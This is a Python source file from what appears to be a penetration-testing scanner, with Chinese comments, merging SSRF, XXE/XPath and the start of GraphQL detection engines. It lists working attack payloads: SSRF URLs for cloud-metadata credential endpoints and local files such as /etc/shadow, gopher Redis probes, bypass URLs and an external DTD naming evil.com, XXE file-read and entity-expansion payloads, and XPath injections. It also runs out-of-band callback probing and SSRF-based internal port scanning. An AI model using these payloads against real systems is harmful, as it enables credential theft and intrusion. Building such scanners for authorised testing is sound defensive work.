# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""
合并网络协议引擎模块
功能：SSRF、XXE、GraphQL 漏洞检测
"""

import re
import asyncio
import json
import random
from vulnclaw.core.utils import async_get, async_post, build_attack_url

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.engines.base import BaseEngine
from typing import Dict, List, Optional, Tuple


# ============================================================

# 从 ssrf.py 合并


# ============================================================

# engines/ssrf.py
"""
SSRF（服务端请求伪造）检测引擎 - 重构版

功能：
1. SSRF 参数探测（url, path, redirect, callback 等）
2. 内网 IP 探测（127.0.0.1, 10.0.0.1, 172.16.0.1, 192.168.1.1）
3. 云元数据探测（169.254.169.254, 100.100.100.200）
4. 协议探测（file://, dict://, gopher://, ftp://）
5. 端口扫描探测（内网服务发现）
6. WAF 绕过

检测流程：
1. 快速探测：识别可能的 SSRF 参数
2. 逐个测试 Payload
3. 检测响应特征（云元数据、内网IP、文件内容）
4. WAF 检测与绕过
"""


class SSRFEngine(BaseEngine):
    """SSRF 服务端请求伪造检测引擎"""

    name = "ssrf"
    description = "SSRF 服务端请求伪造检测引擎"

    # 优先测试的参数名
    priority_params = [
        "url", "path", "redirect", "redirect_uri", "callback", "return",
        "next", "goto", "src", "source", "file", "load", "fetch",
        "proxy", "dest", "target", "link", "href", "image", "img",
        "avatar", "profile_picture", "photo", "cover", "thumbnail",
        "download", "export", "import", "backup", "restore",
        "webhook", "callback_url", "return_url", "success_url",
        "failure_url", "error_url", "cancel_url"
    ]

    # ===== SSRF Payload =====
    payloads = [
        # ===== 内网 IP 探测 =====
        ("http://127.0.0.1", "localhost"),
        ("http://127.0.0.1:80", "localhost:80"),
        ("http://127.0.0.1:8080", "localhost:8080"),
        ("http://127.0.0.1:443", "localhost:443"),
        ("http://0.0.0.0", "0.0.0.0"),
        ("http://localhost", "localhost域名"),
        ("http://localhost:8080", "localhost域名:8080"),
        ("http://[::1]", "IPv6 localhost"),
        ("http://[::1]:8080", "IPv6 localhost:8080"),

        # ===== 内网 IP 段 =====
        ("http://10.0.0.1", "10.0.0.1"),
        ("http://10.0.0.1:80", "10.0.0.1:80"),
        ("http://10.0.0.2", "10.0.0.2"),
        ("http://172.16.0.1", "172.16.0.1"),
        ("http://172.17.0.1", "172.17.0.1"),
        ("http://172.18.0.1", "172.18.0.1"),
        ("http://192.168.1.1", "192.168.1.1"),
        ("http://192.168.1.1:80", "192.168.1.1:80"),
        ("http://192.168.0.1", "192.168.0.1"),
        ("http://192.168.100.1", "192.168.100.1"),

        # ===== 云元数据 =====
        ("http://169.254.169.254/latest/meta-data/", "AWS元数据"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM凭证"),
        ("http://169.254.169.254/latest/user-data/", "AWS用户数据"),
        ("http://169.254.169.254/latest/dynamic/instance-identity/", "AWS实例身份"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP元数据"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "GCP服务账号"),
        ("http://100.100.100.200/latest/meta-data/", "阿里云元数据"),
        ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "阿里云RAM凭证"),
        ("http://169.254.169.254/metadata/instance?api-version=2017-08-01", "Azure元数据"),
        ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack元数据"),
        ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/", "AWS EC2凭证"),
        ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS本地IP"),
        ("http://169.254.169.254/latest/meta-data/public-ipv4", "AWS公网IP"),
        ("http://169.254.169.254/latest/meta-data/hostname", "AWS主机名"),

        # ===== 文件协议 =====
        ("file:///etc/passwd", "file协议-passwd"),
        ("file:///etc/hosts", "file协议-hosts"),
        ("file:///proc/self/environ", "file协议-environ"),
        ("file:///c:/windows/win.ini", "file协议-win.ini"),
        ("file:///etc/shadow", "file协议-shadow"),
        ("file:///var/log/apache/access.log", "file协议-apache日志"),
        ("file:///var/log/nginx/access.log", "file协议-nginx日志"),

        # ===== 其他协议 =====
        ("dict://127.0.0.1:6379/info", "dict协议-Redis"),
        ("dict://127.0.0.1:3306", "dict协议-MySQL"),
        ("dict://127.0.0.1:5432", "dict协议-PostgreSQL"),
        ("gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a", "gopher协议-Redis"),
        ("ftp://127.0.0.1", "ftp协议"),
        ("ftp://127.0.0.1:21", "ftp协议:21"),
        ("ftp://anonymous:anonymous@127.0.0.1", "ftp匿名登录"),
        ("http://localhost:9200", "Elasticsearch"),
        ("http://localhost:5601", "Kibana"),
        ("http://localhost:9090", "Prometheus"),
        ("http://localhost:3000", "Grafana"),
        ("http://localhost:8080/actuator/env", "Spring Actuator"),
        ("http://localhost:8080/druid/index.html", "Druid监控"),

        # ===== URL 绕过 =====
        ("http://127.0.0.1@evil.com", "@绕过"),
        ("http://evil.com@127.0.0.1", "@绕过反向"),
        ("http://127.0.0.1#evil.com", "#绕过"),
        ("http://127.0.0.1.evil.com", "域名伪装"),
        ("http://127.0.0.1%23evil.com", "%23绕过"),
        ("http://127.0.0.1%2f..", "路径绕过"),
        ("http://127.0.0.1/../evil.com", "目录绕过"),
        ("http://127.0.0.1:80@evil.com", "端口绕过"),

        # ===== 内网端口扫描 =====
        ("http://127.0.0.1:22", "SSH端口"),
        ("http://127.0.0.1:3306", "MySQL端口"),
        ("http://127.0.0.1:5432", "PostgreSQL端口"),
        ("http://127.0.0.1:6379", "Redis端口"),
        ("http://127.0.0.1:27017", "MongoDB端口"),
        ("http://127.0.0.1:9200", "Elasticsearch端口"),
        ("http://127.0.0.1:9092", "Kafka端口"),
        ("http://127.0.0.1:2181", "Zookeeper端口"),
        ("http://127.0.0.1:11211", "Memcached端口"),
    ]

    # ===== SSRF 响应特征 =====
    SSRF_INDICATORS = [
        # 云元数据特征
        'ami-id', 'instance-id', 'public-keys', 'security-credentials',
        'meta-data', 'user-data', 'instance-identity',
        'computeMetadata', 'project-id', 'service-accounts',
        'ram/security-credentials', 'instance', 'api-version',

        # 内网服务特征
        'Redis', 'redis_version', 'MySQL', 'PostgreSQL', 'MongoDB',
        'Elasticsearch', 'Kibana', 'Prometheus', 'Grafana',
        'Druid', 'Stat Monitor', 'Zookeeper', 'Kafka',

        # 文件内容特征
        'root:', 'nobody:', 'daemon:', 'bin:',
        'Windows Registry', 'HKEY_LOCAL_MACHINE',
        '127.0.0.1', 'localhost',

        # 协议特征
        'ssh-rsa', 'SSH', 'ssh',
        '220', 'HELO', 'EHLO',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        检测 SSRF 漏洞

        检测流程：
        1. 快速探测：识别可能的 SSRF 参数
        2. 逐个测试 Payload
        3. 检测响应特征
        4. WAF 检测与绕过
        """
        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, _normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        # ===== 1. 快速探测：识别 SSRF 参数 =====
        if not await self._is_ssrf_param(url, param, parsed_query, session):
            self.log_debug(f"参数 {param} 不像是 SSRF 参数，跳过检测")
            return None

        # ===== 2. 获取 Payload =====
        payloads = self.reorder_payloads_by_param(param)

        # 如果是静态资源，减少 Payload
        if is_static:
            payloads = payloads[:8]

        # ===== 2.5 OOB 盲打通道（Interactsh，⑦）=====
        # 注入 http://<scanid>.<interactsh-domain>/ 到 url/redirect/file 参数，
        # DNS/HTTP 轮询命中即确认真 SSRF（不依赖响应回显，天然抗 WAF/CDN 过滤）
        interactsh_domain = kwargs.get('interactsh_domain', None)
        if interactsh_domain:
            oob_finding = await self._test_ssrf_oob(
                url, param, parsed_query, session, interactsh_domain
            )
            if oob_finding:
                return oob_finding

        # ===== 3. 主检测循环 =====
        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                # ===== 检测 WAF =====
                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                # ===== 检测 SSRF 响应特征 =====
                if self._has_ssrf_indicator(text):
                    evidence = self._extract_ssrf_evidence(text, payload)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF({desc})',
                        'ai_verdict': '高',
                        'evidence': evidence,
                        'diff_ratio': 0.5
                    }

                # ===== 检测云元数据 =====
                if self._is_cloud_metadata(text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF-云元数据({desc})',
                        'ai_verdict': '高',
                        'evidence': f"检测到云元数据: {self._extract_cloud_metadata(text)}",
                        'diff_ratio': 0.5,
                        'cloud_metadata': True
                    }

                # ===== 检测响应长度异常 =====
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.3
                )
                if has_diff and len(text) > 100:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF-疑似({desc})',
                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"SSRF 检测异常 {param}: {e}")

        return None

    async def _is_ssrf_param(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> bool:
        """判断参数是否可能用于 SSRF"""
        # 检查参数名
        for p in self.priority_params:
            if p == param.lower():
                return True

        # 尝试简单的 SSRF 探测
        try:
            test_payload = "http://127.0.0.1:8080"
            test_url = build_attack_url(url, param, test_payload, parsed_query)
            resp = await async_get(test_url, session=session, timeout=5)

            if isinstance(resp, tuple):
                text = resp[1]
            else:
                text = await resp.text()

            # 如果响应中包含 URL 相关关键词，可能是 SSRF
            url_keywords = ['http', 'url', 'redirect', 'location', 'fetch']
            if any(kw in text.lower() for kw in url_keywords):
                return True
        except BaseException:
            pass

        return True

    def _has_ssrf_indicator(self, text: str) -> bool:
        """检测 SSRF 响应特征"""
        text_lower = text.lower()
        for indicator in self.SSRF_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_ssrf_evidence(self, text: str, payload: str) -> str:
        """提取 SSRF 证据"""
        # 提取 Payload 中的域名/IP
        url_match = re.search(r'http://([^/\s"\']+)', payload)
        if url_match:
            target = url_match.group(1)
            if target in text:
                return f"响应中包含目标地址: {target}"

        # 提取云元数据特征
        for indicator in ['ami-id', 'instance-id', 'meta-data', 'user-data']:
            if indicator in text:
                lines = text.split('\n')
                for line in lines:
                    if indicator in line:
                        return line[:200]

        return text[:200]

    def _is_cloud_metadata(self, text: str) -> bool:
        """检测是否为云元数据响应"""
        cloud_indicators = [
            'ami-id', 'instance-id', 'security-credentials',
            'meta-data', 'user-data', 'instance-identity',
            'computeMetadata', 'project-id', 'service-accounts',
            'ram/security-credentials'
        ]
        text_lower = text.lower()
        for indicator in cloud_indicators:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_cloud_metadata(self, text: str) -> str:
        """提取云元数据内容"""
        lines = text.split('\n')
        result = []
        for line in lines:
            if any(kw in line.lower() for kw in ['ami-id', 'instance-id', 'meta-data', 'user-data']):
                result.append(line)
            if len(result) >= 5:
                break
        return '\n'.join(result[:5]) if result else text[:200]

    # ============================================================
    # OOB 盲打通道（Interactsh，⑦）
    # ============================================================
    OOB_PAYLOADS = [
        ("http://{scan_id}.{domain}/", "OOB-DNS/HTTP外带"),
        ("http://{scan_id}.{domain}/ssrf-probe", "OOB-HTTP路径探测"),
        ("http://{scan_id}.{domain}:80/?q=1", "OOB-HTTP带参探测"),
        ("https://{scan_id}.{domain}/", "OOB-HTTPS外带"),
    ]

    def _gen_scan_token(self) -> str:
        """生成短且唯一的 scan_id 用于 OOB 命中配对"""
        return f"sr{random.randint(100000, 999999)}"

    async def _test_ssrf_oob(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session,
        interactsh_domain: str
    ) -> Optional[Dict]:
        """OOB 盲打：向 url/redirect/file 参数注入 http://<scanid>.<interactsh-domain>/

        判定逻辑：
        1. 注入唯一 scan_id 前缀域名，后端若发起请求会触发 DNS 解析与 HTTP 回调；
        2. 短轮询 Interactsh，命中（DNS/HTTP 回调包含 scan_id）即确认真 SSRF；
        3. 未命中返回 None，交由 verify 阶段 do_oob_poll 钩子做长轮询确认。
        """
        if not interactsh_domain:
            return None

        from vulnclaw.modules.vuln_scanner.oob_interactsh import get_interactsh_poll

        scan_id = self._gen_scan_token()
        # 命中与扫描周期隔离：OOB 命中记录以 scan_id 前缀标识
        oob_records = []

        for oob_payload, desc in self.OOB_PAYLOADS:
            oob_url = oob_payload.format(scan_id=scan_id, domain=interactsh_domain)
            attack_url = build_attack_url(url, param, oob_url, parsed_query)
            try:
                # 禁跟随重定向：目标若把 url/redirect 参数反射进 Location，
                # 扫描器自身跟随 302 会主动请求 OOB 地址，产生"自回调"并误判实锤。
                resp = await async_get(attack_url, session=session, timeout=10, no_retry=True, allow_redirects=False)
                # OOB 不依赖响应回显：只要请求被服务端处理即可
                if isinstance(resp, tuple):
                    oob_records.append((oob_url, resp[0]))
            except Exception as e:
                logger.debug(f"SSRF OOB 请求失败 {oob_url}: {e}")

        if not oob_records:
            return None

        # 短轮询（复用 verify 阶段的 Interactsh 通道）
        try:
            interactions = await asyncio.wait_for(
                get_interactsh_poll(interactsh_domain, timeout=8), timeout=10
            )
        except Exception as e:
            logger.debug(f"SSRF OOB 轮询失败: {e}")
            interactions = []

        for inter in interactions:
            if not isinstance(inter, dict):
                continue
            raw = str(inter.get("raw-request", ""))
            details = str(inter.get("q-type", "")) + " " + str(inter.get("protocol", ""))
            if scan_id in raw or scan_id in details:
                return {
                    'url': url,
                    'parameter': param,
                    'payload': oob_url,
                    'type': f'SSRF-OOB盲打确认({desc})',
                    'severity': 'High',
                    'ai_verdict': '高',
                    'confidence': 'high',
                    'evidence': (
                        f"Interactsh 命中 scan_id={scan_id}（{'DNS' if inter.get('q-type') else 'HTTP'}回调）: "
                        f"{raw[:200]}"
                    ),
                    'diff_ratio': 0.9,
                    'oob_confirmed': True,
                    'method': 'oob_ssrf'
                }

        # 短轮询未命中 → 返回 OOB-pending finding，交由 verify 阶段长轮询按 scan_id 配对确认
        # 只有"请求确实发出成功"的探测才产生 pending（防止不可达参数刷报告）
        if not oob_records:
            return None
        return {
            'url': url,
            'parameter': param,
            'payload': oob_records[0][0],
            'type': 'SSRF-OOB盲打待确认(DNS/HTTP外带)',
            'severity': 'Medium',
            'ai_verdict': '中（待OOB确认）',
            'confidence': 'low',
            'evidence': (
                f"已向参数 {param} 注入 Interactsh 探测域名，等待 DNS/HTTP 回调"
                f"（scan_id={scan_id}）"
            ),
            'diff_ratio': 0.3,
            'oob_pending': True,
            'oob_scan_id': scan_id,
            'oob_domain': interactsh_domain,
            'method': 'oob_ssrf'
        }

    # ============================================================
    # 内网端口扫描（增强版）
    # ============================================================

    async def scan_internal_ports(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session,
        ports: List[int] = None
    ) -> List[Dict]:
        """
        通过 SSRF 扫描内网端口

        参数:
            url: 目标 URL
            param: SSRF 参数名
            parsed_query: 原始查询字符串
            session: aiohttp ClientSession
            ports: 要扫描的端口列表
        """
        if ports is None:
            ports = [22, 80, 443, 3306, 5432, 6379, 27017, 9200, 9092, 2181, 11211]

        findings = []

        for port in ports:
            payload = f"http://127.0.0.1:{port}"
            test_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(test_url, session=session, timeout=5)

                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                if status < 400 and len(text) > 10:
                    # 检测服务特征
                    service = self._detect_service_by_banner(text, port)
                    findings.append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'port': port,
                        'service': service,
                        'type': f'SSRF-内网服务发现({service})',
                        'ai_verdict': '中',
                        'evidence': f"端口 {port} 可访问，服务: {service}",
                        'diff_ratio': 0.5
                    })
            except BaseException:
                pass

        return findings

    def _detect_service_by_banner(self, text: str, port: int) -> str:
        """根据 Banner 和端口检测服务类型"""
        text_lower = text.lower()

        # 基于端口
        port_service_map = {
            22: 'SSH',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            27017: 'MongoDB',
            9200: 'Elasticsearch',
            9092: 'Kafka',
            2181: 'Zookeeper',
            11211: 'Memcached',
            80: 'HTTP',
            443: 'HTTPS',
            8080: 'HTTP-Alt',
        }

        # 基于 Banner
        banner_map = {
            'ssh': 'SSH',
            'mysql': 'MySQL',
            'postgresql': 'PostgreSQL',
            'redis': 'Redis',
            'mongodb': 'MongoDB',
            'elasticsearch': 'Elasticsearch',
            'kafka': 'Kafka',
            'zookeeper': 'Zookeeper',
            'memcached': 'Memcached',
        }

        for banner, service in banner_map.items():
            if banner in text_lower:
                return service

        return port_service_map.get(port, 'Unknown')


# ============================================================
# 导出
# ============================================================
__all__ = ['SSRFEngine']


# ============================================================

# 从 xxe.py 合并


# ============================================================

# engines/xxe.py
"""
XXE（XML外部实体注入）检测引擎 - 重构版
功能：
1. XML 内容检测
2. XXE Payload 注入（文件读取、内网探测）
3. 响应分析（文件内容、错误信息）
4. WAF 绕过
5. XPath 注入检测（增强）
"""


class XXEEngine(BaseEngine):
    name = "xxe"
    description = "XXE XML外部实体注入检测引擎"

    priority_params = [
        "xml", "data", "payload", "body", "content",
        "soap", "wsdl", "xsd", "dtd", "entity",
        "document", "request", "message", "envelope"
    ]

    payloads = [
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "Linux passwd"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>', "Linux hosts"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', "Linux shadow"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', "Windows win.ini"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>', "Windows hosts"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>', "Linux environ"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>', "内网HTTP探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', "AWS元数据探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/">]><root>&xxe;</root>', "GCP元数据探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>', "参数实体-passwd"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/">%xxe;]><root/>', "参数实体-HTTP"),
        ('<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://evil.com/xxe.dtd"><root>&xxe;</root>', "外部DTD"),
        ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "UTF-8编码"),
        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "UTF-16编码"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>', "PHP Base64编码"),
        ('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', "XInclude passwd"),
        ('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://127.0.0.1:80/"/></root>', "XInclude HTTP"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{{interactsh-domain}}">]><root>&xxe;</root>', "SSRF外带"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a">]><root>&xxe;</root>', "gopher协议-Redis"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">]><root>&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;</root>', "实体爆炸-DoS"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>', "错误信息探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:9999/">]><root>&xxe;</root>', "端口探测"),
    ]

    XXE_INDICATORS = [
        'root:', 'nobody:', 'daemon:', 'bin:', 'sys:',
        'games:', 'man:', 'lp:', 'mail:', 'news:',
        '[boot loader]', '[operating systems]',
        'Windows Registry', 'HKEY_LOCAL_MACHINE',
        '<?php', '<?xml', 'DB_PASSWORD', 'SECRET_KEY',
        'java.io.FileNotFoundException',
        'No such file or directory',
        'Cannot find the declaration of element',
        'Entity not found',
        'XML parsing error',
        'DOCTYPE', 'ENTITY', 'SYSTEM',
        'Connection refused',
        'Connection timed out',
        'Unknown host',
        'ami-id', 'instance-id', 'meta-data',
        'computeMetadata', 'project-id',
        'Redis', 'MySQL', 'PostgreSQL', 'MongoDB',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)
        interactsh_domain = kwargs.get('interactsh_domain', None)

        if not await self._is_xml_target(url, param, normal_text, session):
            self.log_debug(f"目标 {url} 不像是 XML 接口，跳过 XXE 检测")
            return None

        payloads = self.reorder_payloads_by_param(param)

        if interactsh_domain:
            processed_payloads = []
            for payload, desc in payloads:
                if '{{interactsh-domain}}' in payload:
                    new_payload = payload.replace('{{interactsh-domain}}', interactsh_domain)
                    processed_payloads.append((new_payload, f"{desc}(外带)"))
                else:
                    processed_payloads.append((payload, desc))
            payloads = processed_payloads

        if is_static:
            payloads = payloads[:8]

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            content_types = [
                'application/xml',
                'text/xml',
                'application/soap+xml',
                'application/x-www-form-urlencoded',
            ]

            for content_type in content_types[:2]:
                try:
                    headers = {'Content-Type': content_type}

                    if '?' in url or param:
                        attack_url = build_attack_url(url, param, payload, parsed_query)
                        resp = await async_get(attack_url, session=session, headers=headers, timeout=settings.timeout)
                    else:
                        # 尝试直接POST XML，同时也尝试JSON包裹的XML
                        resp = await async_post(
                            url,
                            data=payload,
                            headers=headers,
                            session=session,
                            timeout=settings.timeout
                        )
                        # 如果post失败，尝试JSON格式
                        if isinstance(resp, tuple) and resp[0] >= 400:
                            json_payload = {"xml": payload}
                            resp = await async_post(
                                url,
                                json=json_payload,
                                headers={'Content-Type': 'application/json'},
                                session=session,
                                timeout=settings.timeout
                            )

                    if isinstance(resp, tuple):
                        status, text = resp[0], resp[1]
                    else:
                        status, text = resp.status, await resp.text()

                    waf_type = await self.detect_waf(text)
                    if waf_type:
                        self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                        bypass_result = await self.try_waf_bypass(
                            url, param, payload, parsed_query, session,
                            waf_type, normal_resp
                        )
                        if bypass_result:
                            return bypass_result
                        continue

                    if self._has_xxe_indicator(text):
                        evidence = self._extract_xxe_evidence(text, payload)
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE({desc})',
                            'ai_verdict': '高',
                            'evidence': evidence,
                            'diff_ratio': 0.5
                        }

                    if self._is_base64_content(text):
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE-Base64编码({desc})',
                            'ai_verdict': '高',
                            'evidence': f"检测到 Base64 编码内容: {text[:100]}...",
                            'diff_ratio': 0.5,
                            'base64_encoded': True
                        }

                    has_diff, diff_ratio = self.has_response_diff(
                        normal_resp,
                        (status, text, {}),
                        threshold=0.3
                    )
                    if has_diff and len(text) > 100:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE-疑似({desc})',
                            'ai_verdict': '中',
                            'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                            'diff_ratio': diff_ratio
                        }

                except Exception as e:
                    self.log_debug(f"XXE 检测异常 {param}: {e}")

        return None

    async def _is_xml_target(self, url: str, param: str, normal_text: str, session) -> bool:
        xml_params = ['xml', 'data', 'payload', 'soap', 'wsdl', 'xsd', 'dtd']
        if any(p in param.lower() for p in xml_params):
            return True

        try:
            resp = await async_get(url, session=session, timeout=5)
            if isinstance(resp, tuple):
                headers = resp[2] if len(resp) > 2 else {}
            else:
                headers = resp.headers
            content_type = headers.get('Content-Type', '')
            if 'xml' in content_type.lower() or 'soap' in content_type.lower():
                return True
        except BaseException:
            pass

        if normal_text and ('<?xml' in normal_text or '<soap' in normal_text.lower()):
            return True

        return False

    def _has_xxe_indicator(self, text: str) -> bool:
        text_lower = text.lower()
        for indicator in self.XXE_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_xxe_evidence(self, text: str, payload: str) -> str:
        file_indicators = ['root:', 'nobody:', 'daemon:', 'bin:', 'sys:', 'games:', 'man:', 'lp:', 'mail:', 'news:']
        for indicator in file_indicators:
            if indicator in text:
                lines = text.split('\n')
                for line in lines:
                    if indicator in line:
                        return line[:200]

        error_indicators = ['java.io.FileNotFoundException', 'No such file', 'Connection refused']
        for indicator in error_indicators:
            if indicator in text:
                start = max(0, text.find(indicator) - 20)
                end = min(len(text), text.find(indicator) + 100)
                return text[start:end]

        return text[:200]

    def _is_base64_content(self, text: str) -> bool:
        base64_pattern = r'^[A-Za-z0-9+/=]+$'
        lines = text.split('\n')
        base64_lines = 0
        for line in lines:
            line = line.strip()
            if len(line) > 20 and re.match(base64_pattern, line):
                base64_lines += 1
                if base64_lines > 3:
                    return True
        return False

    async def check_xpath_injection(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session
    ) -> Optional[Dict]:
        if not await self._is_xml_target(url, param, normal_resp[1] if isinstance(normal_resp, tuple) else '', session):
            return None

        xpath_payloads = [
            ("' OR '1'='1", "XPath OR注入"),
            ("' OR 1=1 OR '1'='1", "XPath OR注入2"),
            ("' or 'a'='a", "XPath OR注入3"),
            ("']|//*|/*|//*", "XPath Union"),
            ("'] | //* | /*", "XPath Union2"),
            ("' and 1=1 and '1'='1", "XPath AND注入"),
            ("' and 1=2 and '1'='1", "XPath AND注入2"),
            ("' or position()=1", "XPath位置注入"),
            ("' or count(/*)=1", "XPath计数注入"),
            ("' or substring(//user[1]/password,1,1)='a", "XPath布尔盲注"),
        ]

        for payload, desc in xpath_payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)
                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                xpath_errors = [
                    'XPath', 'xpath',
                    'Invalid predicate',
                    'Invalid expression',
                    'Axis name',
                    'Invalid token',
                    'Unclosed',
                ]

                for error in xpath_errors:
                    if error.lower() in text.lower():
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XPath注入({desc})',
                            'ai_verdict': '高',
                            'evidence': f"检测到 XPath 错误: {error}",
                            'diff_ratio': 0.5
                        }

                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.2
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'XPath注入-疑似({desc})',
                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"XPath 检测异常: {e}")

        return None


# ============================================================

# 从 graphql.py 合并


# ============================================================

# engines/graphql.py
"""
GraphQL 攻击检测引擎 - 重构版
功能：
1. GraphQL 端点自动发现
2. 内省查询检测（获取完整 Schema）
3. 别名碰撞攻击（资源耗尽检测）
4. 递归查询攻击（深度嵌套检测）
